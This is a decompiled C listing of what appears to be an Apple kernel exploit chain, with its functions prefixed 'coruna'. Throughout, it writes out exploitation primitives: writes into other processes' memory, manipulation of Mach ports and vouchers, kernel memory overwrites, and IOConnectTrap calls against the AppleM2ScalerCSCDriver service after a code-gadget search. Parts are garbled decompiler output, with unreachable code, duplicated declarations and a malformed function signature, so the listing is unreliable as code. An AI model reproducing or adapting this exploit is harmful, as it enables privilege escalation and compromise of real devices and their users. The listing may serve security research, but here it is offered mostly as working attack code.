        version = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a0,2,&cache_23)
        ;
        off = 0;
        do {
          serial_9 = (&k_kernel_rodata_word_3b448)[off];
          p_Stack_298 = (pthread_t)(unsigned long)(uint)(&k_kernel_rodata_word_3b460)[off];
          p_Var23 = (pthread_t)(serial_9 + 0x3fffU & 0xffffffffffffc000);
          cache_23 = p_Var23;
          p_Var16 = (pthread_t)
                    (**(void (**)(*(long *)handle[1] + 8))
                              ((long *)handle[1],k_kernel_rodata_word_400a0,2,&cache_23);
          err = off != 2;
          off = off + 1;
        } while (p_Var16 == (pthread_t)0x0 && err);
        off = coruna_kernel6544_via_nop_stub_6_2(*handle,k_kernel_rodata_word_400c8);
        ctx_val = coruna_kernel6544_via_nop_stub_6_2(*handle,k_kernel_rodata_word_400d0);
        cache_24[0] = p_Var16;
        serial = (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400b0,1,cache_24)
        ;
        frame = 1;
        kind = tag;
        if (u < 0x918c5a83400) {
          kind = port;
        }
        serial_7 = (**(void (**)(*(long *)handle[1] + 0x10))((long *)handle[1],k_kernel_rodata_word_40080,0x705d);
        serial_8 = (**(void (**)(*(long *)handle[1] + 0x10))((long *)handle[1],k_kernel_rodata_word_40088,0x705d);
        lm4 = _mach_thread_self();
        serial_10 = 0;
        *(mach_port_t *)((long)handle + 0x14) = lm4;
        ptr = k_kernel_nsconcretestackblock_slot;
        bootargs = k_kernel_rodata_word_3b418;
        do {
          tmp_buf = ptr;
          region = bootargs;
          plist = coruna_call_thread_switch_1aa90;
          url_buf = &k_kernel_rodata_word_3c950;
          json_buf = handle;
          _pthread_create((pthread_t *)((long)cache_24 + serial_10),(pthread_attr_t *)0x0,
                          (void **)coruna_helper_caac_1c948_2,&tmp_buf);
          serial_10 = serial_10 + 8;
        } while (serial_10 != 0x200);
        scratch = k_kernel_nsconcretestackblock_slot;
        thread_attr = coruna_call_thread_policy_set_1b360;
        host_info = &k_kernel_rodata_word_3c970;
        action = &frame;
        stack_guard = port;
        if (u < 0x918c5a83400) {
          stack_guard = tag;
        }
        block_ctx = addr + 8;
        bootargs = 0;
        serial_buf = handle;
        scratch = kind;
        sa_saved = p_Var16;
        sa_new = serial_9;
        _pthread_create(&path_buf,(pthread_attr_t *)0x0,(void **)coruna_helper_caac_1c948_2,&scratch);
        u = tpidr_el0;
        while ((u & 0xffc) == 0) {
          lm4 = _mach_thread_self();
          _thread_switch(lm4,0,0);
          u = tpidr_el0;
        }
        frame = 0;
        do {
          size = coruna_kernel6544_residual_244(*handle,((unsigned long)(serial - off) >> 0xd & 0x7fffffffffffe) + ctx_val
                              );
        } while ((size >> 0xf & 1) == 0);
        *cache_21 = addr;
        cache_21[1] = serial_8;
        _IOConnectTrap6(cache & 0xffffffff,0,0xbee2,0,0,0,0,0);
        err = 8;
        do {
          *cache_21 = k_kernel_rodata_word_400c0;
          cache_21[1] = serial_7;
          _IOConnectTrap6(cache & 0xffffffff,0,base,handle,0x20,version,0,0);
          err = err + -1;
        } while (err != 0);
        do {
        } while (frame != 2);
        cache_23 = p_Var16;
        p_Stack_298 = p_Var23;
        (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_400a8,2,&cache_23);
        DataSynchronizationBarrier(3,3,0);
        (**(void (**)(*(long *)handle[1] + 8))((long *)handle[1],k_kernel_rodata_word_40090,0,0);
        handle = 0;
        *(uint32_t *)((long)handle + 0x14) = 0;
        do {
          _pthread_join(*(pthread_t *)((long)cache_24 + handle),(void **)0x0);
          handle = handle + 8;
        } while (handle != 0x200);
        _pthread_join(path_buf,(void **)0x0);
        coruna_ioserviceclose(handle,&cache);
        version = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot != cache_25) {
        ___stack_chk_fail(version);
        }
        return;
      }
    }
  }
  version = 5;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_25) {
    ___stack_chk_fail(version);
  }
  return;
}





void coruna_helper_caac_1c948_2(long handle)
{
  (**(void (**)(handle + 0x10))();
  return;
}





void coruna_call_thread_switch_1aa90(long handle)
{
  coruna_thread_switch_1aa90(*(uint64_t *)(handle + 0x20));
  return;
}





void coruna_call_thread_policy_set_1b360(long handle)
{
  coruna_thread_policy_set_1b360(*(uint64_t *)(handle + 0x20),handle + 0x28);
  return;
}





uint64_t coruna_vm_read_write(uint64_t val)
{
  unsigned long *address;
  int err;
  kern_return_t lk2;
  vm_map_t target_task;
  vm_size_t scratch;
  unsigned long bootargs;
  long thread_attr;
  
  err = coruna_task_dyld_info(val,&thread_attr);
  if (err == 0) {
    address = (unsigned long *)(thread_attr + 0x28);
    target_task = (vm_map_t)val;
    if (*(vm_map_t *)k_kernel_mach_task_self_slot == target_task) {
      *address = *address | 1;
      return 1;
    }
    lk2 = _vm_read_overwrite(target_task,(vm_address_t)address,8,(vm_address_t)&bootargs,
                               &scratch);
    if (lk2 == 0) {
      bootargs = bootargs | 1;
      lk2 = _vm_write(target_task,(vm_address_t)address,(vm_offset_t)&bootargs,8);
      if (lk2 == 0) {
        return 1;
      }
    }
  }
  return 0;
}





kern_return_t coruna_task_dyld_info(task_name_t arg,long *handle)
{
  kern_return_t lk1;
  mach_msg_type_number_t scratch;
  long bootargs [3];
  
  scratch = 5;
  lk1 = _task_info(arg,0x11,(task_info_t)bootargs,&scratch);
  if (lk1 == 0) {
    if (bootargs[0] == 0) {
      lk1 = 5;
    }
    else {
      lk1 = 0;
      *handle = bootargs[0];
    }
  }
  return lk1;
}





long coruna_kernel6544_via_task_dyld_info(uint64_t val,uint64_t id_2)
{
  uint u;
  int err;
  long handle;
  long scratch;
  
  u = coruna_kernel6544_residual_249(id_2);
  if (((int)u < 0) ||
     (err = coruna_task_dyld_info(*(uint32_t *)k_kernel_mach_task_self_slot,&scratch), err != 0)) {
    handle = 0;
  }
  else {
    handle = 0;
    if (u < 8) {
      handle = scratch + (unsigned long)(u + 6) * 4 + 0xe8;
    }
  }
  return handle;
}





uint32_t coruna_kernel6544_residual_249(uint size)
{
  if (size < 0x1a) {
    return *(uint32_t *)(&k_kernel_rodata_word_3b46c + (long)(int)size * 4);
  }
  return 0xffffffff;
}





uint8_t * coruna_mach_port_mod_refs(long handle,unsigned long arg,mach_port_name_t *arg_x)
{
  uint u;
  int err;
  mach_port_name_t *lpm3;
  uint8_t *ptr;
  uint64_t size;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_voucher_create(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    return &k_kernel_slot_1001;
  }
  else {
    lpm3 = (mach_port_name_t *)coruna_kernel6544_via_task_dyld_info(handle,arg);
    return &k_kernel_slot_1001;
  }
  *arg_x = bootargs;
  return (uint8_t *)0x0;
}





unsigned long coruna_mach_port_deallocate_12b30(uint64_t arg,uint64_t val,vm_size_t n,vm_address_t *m)

{
  uint type_id_13;
  uint type_id_14;
  unsigned long u;
  vm_inherit_t unaff_w22;
  mem_entry_name_port_t cache_33;
  
  cache_33 = 0;
  u = coruna_mach_port_mod_refs(arg,val,&cache_33);
  type_id_13 = (uint)u;
  if (type_id_13 == 0) {
    if (m == (vm_address_t *)0x0) {
      u = 0;
      if (1 < cache_33 + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_33);
      }
      return u;
    }
    type_id_14 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,m,n,0,1,cache_33,0,0,3,2,
                    unaff_w22);
    type_id_13 = 0;
    if (type_id_14 != 0) {
      type_id_13 = type_id_14 | 0x80000000;
    }
    u = (unsigned long)type_id_13;
  }
  if (((type_id_13 != 0) && (m != (vm_address_t *)0x0)) && (*m != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*m,n);
    *m = 0;
  }
load_ok_20:
  if (1 < cache_33 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,cache_33);
  }
  return u;
}





uint64_t coruna_kernel09_via_mach_port_deallocate_12b30(long handle)
{
  uint64_t u;
  uint64_t size;
  uint64_t scratch;
  
  scratch = 0;
  size = *(uint64_t *)k_kernel_vm_page_size_slot;
  if ((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) {
    u = coruna_mach_port_deallocate_12b30(handle,0x10,size,&scratch);
    if ((int)u == 0) {
      *(uint64_t *)(handle + 0x118) = scratch;
      *(uint64_t *)(handle + 0x120) = size;
    }
  }
  else {
    u = 0;
  }
  return u;
}





void coruna_fileport_makefd(void)
{
  _fileport_makefd();
  return;
}





void coruna_mach_port_deallocate_12fb4(long handle,uint32_t *size)
{
  long *ptr;
  mach_port_name_t name;
  uint8_t *ptr;
  bool err;
  int err;
  uint u;
  kern_return_t lk6;
  unsigned long size;
  mach_port_name_t *lpm8;
  unsigned long size;
  uint32_t version;
  mach_port_name_t *lpm10;
  uint64_t port;
  long handle;
  vm_inherit_t in_stack_ffffffffffffff70;
  uint32_t scratch;
  uint64_t *bootargs;
  vm_address_t thread_attr [3];
  mem_entry_name_port_t host_info [4];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  host_info[2] = 0;
  host_info[0] = 0;
  host_info[1] = 0;
  thread_attr[0] = 0;
  size = *(unsigned long *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  scratch = 0xffffffff;
  err = coruna_open_dev_null(&scratch);
  ptr = k_kernel_mach_task_self_slot;
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
  return;
  }
  ___stack_chk_fail(size);
}





uint64_t coruna_mach_port_deallocate_132e8(long handle,mach_port_name_t *arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint scratch;
  uint8_t bootargs[4];
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  off = 0x38;
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return 0;
    }
    off = 0x30;
  }
  handle = coruna_ret_stub_3(handle,*arg);
  if (handle == 0) {
    return 0;
  }
  u = coruna_kernel6544_via_fcntl_1bf84(handle,handle,&scratch);
  if ((int)u == 0) {
    return u;
  }
  if ((scratch & 0x3ff) == 0x25) {
    addr = coruna_return_zero_2b000(handle,handle);
    if (addr == 0) {
      return 0;
    }
    err = coruna_kernel6544_residual_256(handle,addr + off,&thread_attr);
    if (err == 0) {
      return 0;
    }
    if (handle != thread_attr) {
      return 0;
    }
    u = coruna_kernel6544_via_fcntl_1bf84(handle,addr + 8,bootargs);
    if ((int)u == 0) {
      return u;
    }
    u = coruna_mach_vm_machine_attribute(handle,addr + 8,0xffff);
    if ((int)u == 0) {
      return u;
    }
    lk2 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,*arg);
    if (lk2 == 0) {
      *arg = 0;
      handle = coruna_ret_stub_3(handle,val);
      if (handle == 0) {
        return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8(handle,addr + off,handle);
      if ((int)u == 0) {
        return u;
      }
      coruna_kernel6544_via_kernel6544_via_kernel6544_via_fcntl_1bf84_2(handle,handle);
      return 1;
    }
  }
  return 0;
}





uint8_t * coruna_mach_port_deallocate_13478(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint u;
  mach_port_name_t *lpm3;
  long handle;
  uint8_t *ptr;
  uint64_t size;
  long scratch;
  mach_port_name_t bootargs;
  
  bootargs = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    err = coruna_voucher_create(handle,(arg & 0xffffffff) + 0x1122334455667788,&bootargs);
    if ((err == 0) || (err = coruna_mach_port_deallocate_132e8(handle,&bootargs,val), err == 0))
    ptr = &k_kernel_slot_1001;
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
    return ptr;
  }
  else {
    scratch = 0;
    lpm3 = (mach_port_name_t *)coruna_kernel6544_via_task_dyld_info(handle,arg);
    if (lpm3 == (mach_port_name_t *)0x0) {
fail:
      ptr = &k_kernel_slot_1001;
      if (1 < bootargs + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
      }
      return ptr;
    }
    handle = coruna_ret_stub_3(handle,val);
    if (handle == 0) {
      ptr = (uint8_t *)0x2800e;
      if (1 < bootargs + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
      }
      return ptr;
    }
    ptr = (uint8_t *)coruna_kernel6544_via_kernel6544_via_kernel6544_via_fcntl_1bf84_2(handle,handle);
    if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    }
    return ptr;
  }
  ptr = (uint8_t *)0x0;
done:
  if (1 < bootargs + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
  }
  return ptr;
}





void coruna_mach_port_insert_right(int flags)
{
  uint name;
  uint8_t *ptr;
  kern_return_t lk2;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  if (lk2 == 0) {
    name = flags << 8 | 3;
    lk2 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,scratch,0x15);
    if (lk2 == 0) {
      _mach_port_deallocate(*(ipc_space_t *)ptr,name);
    }
  }
  if (1 < scratch + 1) {
    _mach_port_mod_refs(*(ipc_space_t *)ptr,scratch,1,-1);
  }
  return;
}





unsigned long coruna_mach_make_memory_entry(uint64_t arg,uint64_t val,size_t n,vm_offset_t m,
                  vm_address_t *p)
{
  uint8_t *data;
  bool err;
  uint u;
  unsigned long size;
  vm_inherit_t in_stack_ffffffffffffff90;
  size_t cache_21;
  mem_entry_name_port_t cache_34;
  vm_offset_t scratch;
  
  data = k_kernel_mach_task_self_slot;
  cache_34 = 0;
  err = m == 0;
  cache_21 = n;
  scratch = m;
  if ((m == 0) &&
     (u = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,n,1),
     u != 0)) {
    err = false;
    size = (unsigned long)(u | 0x80000000);
    if (1 < cache_34 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
    }
    if (err) {
    _vm_deallocate(*(vm_map_t *)data,scratch,n);
    }
    return size;
  }
  u = _mach_make_memory_entry(*(vm_map_t *)data,&cache_21,scratch,3,&cache_34,0);
  if (u != 0) {
    size = (unsigned long)(u | 0x80000000);
  }
  else if (cache_21 == n) {
      size = coruna_mach_port_deallocate_14118(arg,val,cache_34);
      if (((int)size == 0) && (m == 0)) {
        u = _vm_map(*(vm_map_t *)data,p,n,0,1,cache_34,0,0,3,2,
                        in_stack_ffffffffffffff90);
        if (u == 0) {
          _bzero((void *)*p,n);
          size = 0;
          if (1 < cache_34 + 1) {
          _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
          }
          if (err) {
          _vm_deallocate(*(vm_map_t *)data,scratch,n);
          }
          return size;
        }
        size = (unsigned long)(u | 0x80000000);
      }
  }
  else {
      size = 0xad022;
  }
  if (((int)size != 0 && m == 0) && (*p != 0)) {
    _vm_deallocate(*(vm_map_t *)data,*p,n);
  }
  if (1 < cache_34 + 1) {
    _mach_port_deallocate(*(ipc_space_t *)data,cache_34);
  }
  if (err) {
    _vm_deallocate(*(vm_map_t *)data,scratch,n);
  }
  return size;
}





void coruna_kernel09_via_mach_make_memory_entry(long handle)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  
  ptr = k_kernel_vm_page_size_slot;
  scratch = 0;
  err = coruna_mach_make_memory_entry((int)handle,0x10,*(uint64_t *)k_kernel_vm_page_size_slot,0,&scratch);
  if (err == 0) {
    u = *(uint64_t *)ptr;
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}





void coruna_mach_port_deallocate_13ae4(uint *size)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  uint version;
  long addr;
  long off;
  long base;
  long scratch;
  mach_port_name_t bootargs;
  uint thread_attr;
  uint host_info [4];
  uint32_t serial_buf[4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  off = 0x1122334455667788;
  u = coruna_voucher_create(size,0x1122334455667788,serial_buf);
  if ((((int)u != 0) && (handle = coruna_ret_stub_3(size,serial_buf[0]), u = 0, handle != 0)) &&
     (u = coruna_kernel6544_via_fcntl_1bf84(size,handle,&thread_attr), ptr = k_kernel_mach_task_self_slot,
     (int)u != 0)) {
    if ((thread_attr & 0x3ff) != 0x22) {
      u = 0;
      host_info[0] = size[0x64c];
      host_info[1] = size[0x64d];
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(u);
}





void coruna_mach_make_memory_entry_13d78(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  uint u;
  int err;
  mach_port_name_t *lpm5;
  unsigned long size;
  mach_port_name_t *lpm7;
  long handle;
  size_t size;
  long addr;
  vm_inherit_t in_stack_ffffffffffffff60;
  mach_port_name_t lm10;
  mem_entry_name_port_t scratch;
  uint64_t *bootargs;
  size_t thread_attr;
  uint host_info;
  mach_port_name_t serial_buf [5];
  mem_entry_name_port_t action;
  long block_ctx;
  
  block_ctx = *(long *)k_kernel_stack_chk_guard_slot;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  bootargs = (uint64_t *)0x0;
  thread_attr = size;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    serial_buf[3] = 0;
    size = coruna_voucher_create(handle,0x3122334455667788,serial_buf + 3);
    lm10 = serial_buf[3];
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else {
    lpm5 = (mach_port_name_t *)coruna_kernel6544_via_task_dyld_info(handle,0);
    size = 0;
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  serial_buf[0] = lm10;
  if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
    addr = coruna_ret_stub_3(handle);
    size = 0;
    if ((addr == 0) || (size = coruna_kernel6544_via_fcntl_1bf84(handle,addr,&host_info), (int)size == 0))
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  else if (lm10 + 1 < 2) {
done:
    ptr = k_kernel_mach_task_self_slot;
    err = *(int *)(handle + 0xe8);
    if (((((err + 1U < 2) || (*(long *)(handle + 0xf8) == 0)) ||
         (*(long *)(handle + 0x100) == 0)) ||
        ((lm10 = *(mach_port_name_t *)(handle + 0x114), lm10 + 1 < 2 ||
         (serial_buf[3] = lm10, serial_buf[4] = err, *(long *)(&k_kernel_slot_19d0 + handle) == 0)))) ||
       (*(long *)(handle + 0xf0) == 0)) {
cleanup:
      size = 0;
    }
    else {
      lk2 = _mach_make_memory_entry
                        (*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,0,0x20003,&scratch,0
                        );
      size = 0;
      if (lk2 == 0) {
        action = scratch;
        lk2 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&bootargs,size,0,1,scratch,0,0,3,2,
                        in_stack_ffffffffffffff60);
        size = 0;
        if (lk2 == 0) {
          _bzero(bootargs,size);
          *bootargs = *(uint64_t *)(&k_kernel_slot_19d0 + handle);
          bootargs[1] = *(uint64_t *)(handle + 0xf0);
          *(int *)(bootargs + 2) = (int)*(uint64_t *)(handle + 0x108);
          *(uint32_t *)((long)bootargs + 0x14) = *(uint32_t *)(handle + 0x110);
          u = _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)bootargs,size);
          size = (unsigned long)u;
          addr = 0;
          lpm5 = serial_buf;
          do {
            if (*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) {
              lm10 = 0;
              size = coruna_voucher_create(handle,addr + 0x3122334455667788,&ghidra_stack_1);
              if ((int)size == 0) break;
              *lpm5 = lm10;
              size = coruna_mach_port_deallocate_132e8(handle,lpm5,serial_buf[addr + 3]);
              if ((int)size == 0) break;
            }
            else {
              lpm7 = (mach_port_name_t *)coruna_kernel6544_via_task_dyld_info(size,addr);
              size = 0;
              if (lpm7 == (mach_port_name_t *)0x0) break;
              lm10 = serial_buf[addr + 3];
              handle = coruna_ret_stub_3(handle,lm10);
              size = 0;
              if (handle == 0) break;
              err = coruna_kernel6544_via_kernel6544_via_kernel6544_via_fcntl_1bf84_2(handle,handle);
              if ((err != 0) ||
                 (lk2 = _mach_port_mod_refs(*(ipc_space_t *)ptr,lm10,0,0xffff), lk2 != 0))
              goto cleanup;
              *lpm7 = lm10;
            }
            addr = addr + 1;
            lpm5 = lpm5 + 1;
            size = 1;
          } while (addr != 3);
        }
      }
    }
    if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
    }
    return;
  }
  size = 1;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != block_ctx) {
    ___stack_chk_fail(size);
  }
  return;
}





void coruna_mach_make_memory_entry_1d4a0(long handle)
{
  mach_port_name_t name;
  uint8_t *ptr;
  bool err;
  int err;
  kern_return_t lk4;
  int *err;
  mach_port_name_t *lpm6;
  bool status;
  size_t size;
  long handle;
  mem_entry_name_port_t scratch;
  uint64_t *address;
  size_t bootargs;
  mach_port_name_t thread_attr;
  mem_entry_name_port_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  size = *(size_t *)k_kernel_vm_page_size_slot;
  address = (uint64_t *)0x0;
  bootargs = size;
  if (0x1f543c407fffff < *(unsigned long *)(handle + 0x158)) {
    err = (int *)coruna_kernel6544_via_task_dyld_info(handle,0);
    err = false;
    if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
    }
    ___stack_chk_fail(err);
  }
done:
  err = false;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(err);
}





uint64_t coruna_mach_port_deallocate_1d70c(long handle,uint *size)
{
  mach_port_name_t name;
  int err;
  uint8_t *ptr;
  bool err;
  kern_return_t lk4;
  int status;
  uint64_t u;
  mach_port_name_t *lpm7;
  bool status;
  unsigned long size;
  unsigned long version;
  vm_size_t size;
  int flags;
  long handle;
  int scratch;
  uint64_t *address;
  mach_port_name_t bootargs;
  mem_entry_name_port_t thread_attr;
  
  address = (uint64_t *)0x0;
  _local_58 = 0;
  size = *(vm_size_t *)k_kernel_vm_page_size_slot;
  scratch = -1;
  if ((*(unsigned long *)(handle + 0x158) < 0x1f543c40800000) ||
     (u = coruna_open_dev_null(&scratch), ptr = k_kernel_mach_task_self_slot, (int)u != 0)) {
    u = 0;
  }
  else {
    handle = 0;
    flags = 0x28026;
    err = true;
    do {
      status = err;
      lpm7 = (mach_port_name_t *)coruna_kernel6544_via_task_dyld_info(u,handle);
      status = 0x28026;
      if (lpm7 == (mach_port_name_t *)0x0) goto fail;
      name = *lpm7;
      (&bootargs)[handle] = name;
      if ((name + 1 < 2) ||
         (lk4 = _mach_port_mod_refs(*(ipc_space_t *)ptr,name,0,1), status = flags, lk4 != 0))
      goto fail;
      handle = 1;
      u = 0;
      err = false;
    } while (status);
    lk4 = _vm_map(*(vm_map_t *)ptr,(vm_address_t *)&ghidra_stack_2,size,0,1,thread_attr,0
                    ,0,3,2,(vm_inherit_t)address);
    if (lk4 == 0) {
      u = *address;
      handle = coruna_ptr_canonicalize(handle,u);
      if (handle != 0) {
        *(uint64_t *)(&k_kernel_slot_19d0 + handle) = u;
        u = address[4];
        handle = coruna_ptr_canonicalize(handle,u);
        if (handle != 0) {
          *(uint64_t *)(&k_kernel_slot_1898 + handle) = u;
          if (address[5] - 1 < 0x20) {
            *(int *)(&k_kernel_slot_18a0 + handle) = (int)address[5];
            *(mach_port_name_t *)(handle + 0x58) = bootargs;
            size = address[6];
            if ((((size != 0) && ((size & 7) == 0)) &&
                (flags = *(int *)(address + 7), flags != 0)) &&
               (((version = address[8], version != 0 && ((version & 7) == 0)) &&
                (err = *(int *)(address + 9), err != 0)))) {
              *(unsigned long *)(handle + 0x80) = size;
              *(int *)(handle + 0x88) = flags;
              *(unsigned long *)(handle + 0xa0) = version;
              *(int *)(handle + 0xa8) = err;
              status = coruna_pthread_mach_thread_np(handle,1);
              if (status == 0) {
                coruna_close(scratch);
                scratch = -1;
                status = coruna_pthread_mach_thread_np_1f90c(handle,0);
              }
            }
          }
        }
      }
    }
fail:
    if (scratch != -1) {
      coruna_close();
    }
    if (status != 0) {
      handle = 0;
      err = true;
      do {
        status = err;
        if (1 < (&bootargs)[handle] + 1) {
          _mach_port_deallocate(*(ipc_space_t *)ptr,(&bootargs)[handle]);
        }
        handle = 1;
        err = false;
      } while (status);
    }
    if (address != (uint64_t *)0x0 && size != 0) {
      _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)address,size);
    }
    *size = (uint)(status == 0);
    u = 1;
  }
  return u;
}





uint64_t
void coruna_open_m2scaler_144a8(uint64_t val,uint64_t id_2,long handle,uint64_t size_3,
            uint64_t off_4,uint64_t off_5,unsigned long *arg)
{
  long handle;
  uint u;
  uint size;
  int err;
  long addr;
  long off;
  uint64_t version;
  uint64_t port;
  long base;
  unsigned long tag;
  uint8_t tag[16];
  int scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t host_info;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  uint64_t block_ctx;
  long stack_guard;
  
  tag = (*(void (*)k_kernel_chkstk_darwin_slot)();
  addr = tag;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  bootargs = 0;
  u = *(uint *)(addr + 0x180);
  size = 0;
  if (u != 0) {
    size = 0x1000 / u;
  }
  err = 0x1000 - size * u;
  scratch = 0x1000;
  if (err != 0) {
    scratch = (u - err) + 0x1000;
  }
  if (*(long *)(addr + 0x200) == 0) {
    coruna_macho_text_sect(&action,*(uint64_t *)(&k_kernel_slot_19f8 + addr));
    scratch = bootargs;
    thread_attr = action;
    host_info = block_ctx;
    off = coruna_strsep(&action,"00 00 01 91 C0 03 5F D6",0,0);
    if (off == 0) {
      version = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return version;
      }
      ___stack_chk_fail();
    }
    *(long *)(addr + 0x200) = off;
  }
  version = _IOServiceMatching("AppleM2ScalerCSCDriver");
  port = _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,version);
  u = (int)port + 1;
  if (u < 2) {
done:
    version = 0;
  }
  else {
    err = _IOServiceOpen(port,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
    version = 0;
    if (err == 0) {
      if (serial_buf + 1U < 2) goto done;
      off = coruna_kernel6544_via_return_zero_2b000(addr);
      version = 0;
      if (1 < serial_buf + 1U) {
      _IOServiceClose();
      }
      if (1 < u) {
      _IOObjectRelease(port);
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return version;
      }
      ___stack_chk_fail();
      err = coruna_kernel6544_residual_256(addr,off,&bootargs);
      if (((err == 0) || (base = coruna_ptr_canonicalize(addr,bootargs), base == 0)) ||
         (base = coruna_mach_port_request_notification(addr,&scratch), base == 0)) goto done;
      err = coruna_nop_stub_6(addr,bootargs,0x1000,&action);
      if ((err == 0) || (err = coruna_nop_stub_7(addr,base,&action,0x1000), err == 0)) {
check_ok:
        version = 0;
      }
      else {
        handle = 0x5c0;
        if (*(int *)(addr + 0x140) < 0x1809) {
          handle = 0x5b8;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8(addr,handle + base,*(uint64_t *)(addr + 0x200));
        if (err == 0) goto check_ok;
        coruna_call_mach_vm_machine_attribute_29df8(addr,off,base);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off + 0x40,8);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off + 0x48,tag);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off + 0x50,handle * 2 + -0x10);
        tag = _IOConnectTrap4(serial_buf,0,size_3,off_4,off_5,0);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off + 0x40,0);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off + 0x48,0);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off + 0x50,0);
        coruna_call_mach_vm_machine_attribute_29df8(addr,off,bootargs);
        if (arg != (unsigned long *)0x0) {
          *arg = tag & 0xffffffff;
        }
        version = 1;
      }
      coruna_mach_port_allocate(addr,base,scratch);
    }
  }
cleanup:
  if (1 < serial_buf + 1U) {
    _IOServiceClose();
  }
  if (1 < u) {
    _IOObjectRelease(port);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
    return version;
  }
  ___stack_chk_fail();
}





void coruna_strsep(uint64_t *val,char *path,uint32_t size,uint32_t flags_2)
{
  int err;
  char *ptr;
  char *buf;
  long handle;
  uint64_t u;
  long addr;
  long off;
  char *scratch;
  uint64_t scratch;
  uint64_t bootargs;
  char *thread_attr;
  ushort host_info [128];
  long serial_buf;
  
